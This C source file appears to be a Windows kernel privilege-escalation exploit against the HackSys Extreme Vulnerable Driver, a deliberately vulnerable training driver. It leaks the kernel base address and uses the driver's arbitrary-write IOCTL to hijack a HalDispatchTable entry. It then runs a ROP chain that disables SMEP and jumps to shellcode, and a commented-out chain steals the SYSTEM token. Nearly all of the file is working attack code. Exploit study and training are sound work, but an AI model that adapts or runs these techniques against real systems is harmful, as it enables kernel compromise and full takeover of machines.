#include <windows.h>
#include <stdio.h>
#include <psapi.h>

extern int shellcode_buf;

char DEVICE_NAME[] = "\\\\.\\HacksysExtremeVulnerableDriver";

#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW_GS               CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_POOL_OVERFLOW                   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT             CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_USE_UAF_OBJECT                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT                 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x806, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT            CTL_CODE(FILE_DEVICE_UNKNOWN, 0x807, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_TYPE_CONFUSION                  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x808, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_INTEGER_OVERFLOW                CTL_CODE(FILE_DEVICE_UNKNOWN, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80A, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80B, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_UNINITIALIZED_HEAP_VARIABLE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80C, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_DOUBLE_FETCH                    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80D, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HACKSYS_EVD_IOCTL_INSECURE_KERNEL_FILE_ACCESS     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x80E, METHOD_NEITHER, FILE_ANY_ACCESS)

#define MAXIMUM_FILENAME_LENGTH 255 

typedef void (*NtQueryIntervalProfile_t)(int arg1, int arg2);

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
	);
typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
} WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

DWORD WINAPI    ArbitraryOverwriteThread(LPVOID Parameter);

PVOID AddPtrOffset(CHAR* ptr_1, int ptr_2) {
	PVOID ptr_res = ptr_1 + ptr_2;
	return (PVOID)ptr_res;
}

PVOID GetKernelBase() {
	printf("[*] Getting the kernel base address\n");
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	if (ntdll == NULL) {
		printf("[-] Failed to get a handle to ntdll\n");
		return 1;
	}
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] Failed to get the NtQuerySystemInformation address\n");
		return 1;
	}
	ULONG len = 0;
	query(SystemModuleInformation, NULL, 0, &len);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len);
	if (pModuleInfo == NULL) {
		printf("[-] Failed to get the PSYSTEM_MODULE_INFORMATION.\n");
		return 1;
	}
	NTSTATUS status = query(SystemModuleInformation, pModuleInfo, len, &len);

	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 1;
	}
	printf("[*] ntoskrnl: %p\n", pModuleInfo->Modules[0].ImageBaseAddress);
	return pModuleInfo->Modules[0].ImageBaseAddress;
}

PVOID GetHalDispatchTable(PVOID KernelBase) {
	printf("[*] Getting the HalDispatchTable\n");
	PVOID HalDispatchTable = AddPtrOffset(KernelBase, 0x00c00a60);
	printf("[*] HalDispatchTable: %p\n", HalDispatchTable);
	return HalDispatchTable;
}

PVOID GetHaliQuerySystemInformation(PVOID HalDispatchTable) {
	printf("[*] Getting the HaliQuerySystemInformation address\n");
	PVOID HaliQuerySystemInformation = AddPtrOffset(HalDispatchTable, 0x8);
	printf("[*] HaliQuerySystemInformation: %p\n", HaliQuerySystemInformation);
	return HaliQuerySystemInformation;
}

HANDLE GetDeviceHandle() {
	HANDLE hFile;
	hFile = CreateFileA(DEVICE_NAME,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		0x40000080,
		NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[X] Couldn't get handle%X\n", GetLastError());
		exit(-1);
	}
	else {
		printf("[*] Opened handle to %s\n", DEVICE_NAME);
	}
	return hFile;
}

int WriteWhereWhat(HANDLE hFile, PVOID WriteWhere, PVOID WriteWhat) {
	PWRITE_WHAT_WHERE WriteWhatWhere = NULL;
	ULONG BytesReturned;

	WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		sizeof(WRITE_WHAT_WHERE));

	if (!WriteWhatWhere) {
		printf("[-] Failed To Allocate Memory: 0x%X\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	WriteWhatWhere->What = (PULONG_PTR)&WriteWhat;
	WriteWhatWhere->Where = (PULONG_PTR)WriteWhere;

	int IOStatus = DeviceIoControl(hFile,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		(LPVOID)WriteWhatWhere,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&BytesReturned,
		NULL);

	HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere);
	WriteWhatWhere = NULL;
}

void append(char* s, char c) {
	int len = strlen(s);
	s[len] = c;
	s[len + 1] = '\0';

}

int SetRSI(PVOID BufferLocation) {
	printf("[*] SetRSI(%p)\n", BufferLocation);
	unsigned char code[12] = "\x48\xBE";
	append(code, (CHAR)((SIZE_T)BufferLocation & 0xFF));
	append(code, (CHAR)(((SIZE_T)BufferLocation & 0xff00) / 0x100));
	append(code, (CHAR)(((SIZE_T)BufferLocation & 0xff0000) / 0x10000));
	append(code, (CHAR)(((SIZE_T)BufferLocation & 0xff000000) / 0x1000000));
	append(code, (CHAR)(((SIZE_T)BufferLocation & 0xff00000000) / 0x100000000));
	append(code, (CHAR)(((SIZE_T)BufferLocation & 0xff0000000000) / 0x10000000000));
	append(code, (CHAR)(((SIZE_T)BufferLocation & 0xff000000000000) / 0x1000000000000));
	append(code, (CHAR)(((SIZE_T)BufferLocation & 0xff00000000000000) / 0x100000000000000));
	append(code, '\xC3');
	void* exec = VirtualAlloc(0, sizeof code, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (exec == NULL) {
		printf("[-] Failed to allocate shellcode to setRSI");
		return 1;
	}
	memcpy(exec, code, sizeof code);
	((void(*)())exec)();
	return 0;
}

DWORD WINAPI ThreadFunc() {
	Sleep(500);
	WinExec("cmd", 1);
	return 0;
}


int main() {
	HANDLE hFile = NULL;
	LPCSTR FileName = (LPCSTR)DEVICE_NAME;

	// Get the kernel base address
	PVOID KernelBase = GetKernelBase();

	// Get the HalDispatchTable address
	PVOID HalDispatchTable = GetHalDispatchTable(KernelBase);

	// Get the HaliQuerySystemInformationAddress address
	PVOID HaliQuerySystemInformationAddress = GetHaliQuerySystemInformation(HalDispatchTable);

	// Create some distance between the RSI offset and our final buffer.
	PVOID RsiBufferLocation = AddPtrOffset(KernelBase, 0xCE9598 - 0x100);

	// Location of the RSI gadget
	PVOID RsiGadgetLocation = AddPtrOffset(RsiBufferLocation, 0x39);

	// Set the final buffer (ROP chain) location
	PVOID BufferLocation = AddPtrOffset(KernelBase, 0xCE9598);

	HANDLE execthread = CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL);


	__try {
		// Get the device handle
		printf("[*] Getting Device Driver Handle\n");
		printf("[*] Device Name: %s\n", FileName);

		hFile = GetDeviceHandle(FileName);

		if (hFile == INVALID_HANDLE_VALUE) {
			printf("[-] Failed Getting Device Handle: 0x%X\n", GetLastError());
			exit(EXIT_FAILURE);
		}
		else {
			printf("[*] Device Handle: 0x%X\n", hFile);
		}

		int offset = -0x8;


		PVOID ShellcodeBuffer = VirtualAlloc(0, 0x100, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (ShellcodeBuffer == NULL) {
			printf("[-] Failed to allocate buffer for shellcode");
		}
		memcpy(ShellcodeBuffer, &shellcode_buf, 0x100);

		// Overwrite HalDispatchTable entry with our first gadget
		WriteWhereWhat(hFile, HaliQuerySystemInformationAddress, AddPtrOffset(KernelBase, 0x434f8d)); // push qword[rbx]; jmp qword[rsi + 0x39]; (1 found)

		// Take control over the stack in our second gadget
		WriteWhereWhat(hFile, RsiGadgetLocation, AddPtrOffset(KernelBase, 0x5b784e)); // pop rsp; ret; (1 found)

		// Prepare our ROP chain
		// Disable SMEP
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x51b5f5)); // pop rcx; ret; (1 found)
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x250ef8); // Cr4 with SMEP disabled
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x9a63e3)); // mov cr4, rcx; ret; (1 found)

		// Restore HaliQuerySystemInformation
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x098f9d0)); // Address of the HaliQuerySystemInformation function
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x5e602d)); // pop rdx; ret; (1 found)
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), HaliQuerySystemInformationAddress); // Location where HaliQuerySystemInformation should be
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x7567b8)); // xor eax, eax; mov qword[rdx], rcx; ret; (1 found)

		// Store the JMP RAX
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x5e602d)); // pop rdx; ret; (1 found)
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x523fe0)); // jmp rax ; (1 found)

		// Exec shellcode
		WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), ShellcodeBuffer); // Jump to our shellcode


		//// ========================
		//// ROP METHOD

		//// Overwrite HalDispatchTable entry with our first gadget
		//WriteWhereWhat(hFile, HaliQuerySystemInformationAddress, AddPtrOffset(KernelBase, 0x434f8d)); // push qword[rbx]; jmp qword[rsi + 0x39]; (1 found)

		//// Take control over the stack in our second gadget
		//WriteWhereWhat(hFile, RsiGadgetLocation, AddPtrOffset(KernelBase, 0x5b784e)); // pop rsp; ret; (1 found)

		//// Prepare our ROP chain
		//// debug our chain
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x5bee0c)); // int3; ret; (1 found)
		//// ==============

		//// Restore HaliQuerySystemInformation
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x098f9d0)); // Address of the HaliQuerySystemInformationAddress function
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x5e602d)); // pop rdx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), HaliQuerySystemInformationAddress); // Location where HaliQuerySystemInformation should be
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x7567b8)); // xor eax, eax; mov qword[rdx], rcx; ret; (1 found)

		////WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x5bee0c)); // int3; ret; (1 found)

		//// Getting a pointer to the SYSTEM token
		//// Get the _ETHREAD
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x2953c0)); // mov rax, qword[gs:0x00000188]; ret; (1 found)
		//// Get the _EPROCESS
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0xb8); // RCX filler
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x52f5fb)); // add rax, rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x32028f)); // mov rax, qword[rax]; ret; (1 found)

		//// Get the SYSTEM _EPROCESS using ActiveProcessLinks
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x448); // RCX filler
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x52f5fb)); // add rax, rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x32028f)); // mov rax, qword[rax]; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x32028f)); // mov rax, qword[rax]; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x448); // RCX filler
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x6db516)); // sub rax, rcx; ret; (1 found)
		//// Get the SYSTEM process token from _EPROCESS and store it in RSI
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x4b8); // RCX filler
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x52f5fb)); // add rax, rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x32028f)); // mov rax, qword[rax]; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x4036a4)); // and al, 0xF0; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x21cac3)); // push rax; pop rsi; ret; (1 found)

		//// Replace current token with SYSTEM token
		//// Get the _ETHREAD
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x2953c0)); // mov rax, qword[gs:0x00000188]; ret; (1 found)
		//// Get the _EPROCESS
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0xb8); // RCX filler
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x52f5fb)); // add rax, rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x32028f)); // mov rax, qword[rax]; ret; (1 found)
		//// Get the current process token
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x4b8); // RCX filler
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x52f5fb)); // add rax, rcx; ret; (1 found)
		//// Replace current token with the SYSTEM process token
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x2edccd)); // mov qword[rax], rsi; mov al, 0x01; mov rsi, qword[rsp + 0x58]; add rsp, 0x40; pop rdi; ret; (1 found)
		//// RSP offset fillers
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x0);

		//// Create our endless loop
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x5bee0c)); // int3; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x3fa770)); // lea rax, qword [rsp+0x08] ; ret ; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x221c9e)); // mov rax, qword [rax] ; ret ; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x523fe0)); // jmp rax ; (1 found)

		// Prepare our wiping loop
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), AddPtrOffset(KernelBase, 0x57adf1)); // pop rcx; ret; (1 found)
		//WriteWhereWhat(hFile, (SIZE_T)BufferLocation + (offset += 0x8), 0x100); // RCX filler
		// get stack offset (bit higher to cover all)
		// we need some loop that will clear out the dref value of that
		// fix the hali function with its offset in kernel


		// Set RSI to the RsiBufferLocation
		SetRSI(RsiBufferLocation);

		typedef void (*PtrNtQueryIntervalProfile)(PVOID arg0, PVOID arg1);
		HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
		PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
		if (_NtQueryIntervalProfile == NULL) {
			printf("[-] Failed to get address of NtQueryIntervalProfile.\n");
			exit(-1);
		}
		//HANDLE wiperthread = CreateThread(NULL, 0, WiperFunc, NULL, 0, NULL);
		printf("[*] Calling NtQueryIntervalProfile\n\n");
		_NtQueryIntervalProfile(0xdeadbeefdeadbeef, &BufferLocation);

	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		printf("[-] Exception: 0x%X\n", GetLastError());
		exit(EXIT_FAILURE);
	}

	return EXIT_SUCCESS;
}